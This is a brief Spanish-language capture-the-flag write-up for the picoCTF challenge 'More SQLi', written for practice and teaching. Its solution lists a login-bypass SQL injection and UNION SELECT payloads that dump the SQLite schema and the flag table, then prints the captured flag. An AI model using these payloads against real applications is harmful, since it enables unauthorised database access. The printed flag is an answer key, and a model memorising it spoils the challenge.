**Reto:** More SQLi

**Descripción:**
¿Puedes encontrar la bandera en este sitio web?

Habrá detalles adicionales disponibles después de lanzar su instancia de desafío.

**Solución:**
username:
admin
password:
'or 1=1;--'

' UNION SELECT name, sql, null from sqlite_master;--
' UNION SELECT flag, null, null from more_table;--

| If you are here, you must have seen it                  |     |
| ------------------------------------------------------- | --- |
| picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_c8ee9477} |     |
**Notas adicionales:**

**Referencias:** 
https://youtu.be/clMe4yqL6yU?si=AcAOiIJ_MQ5NOyLD
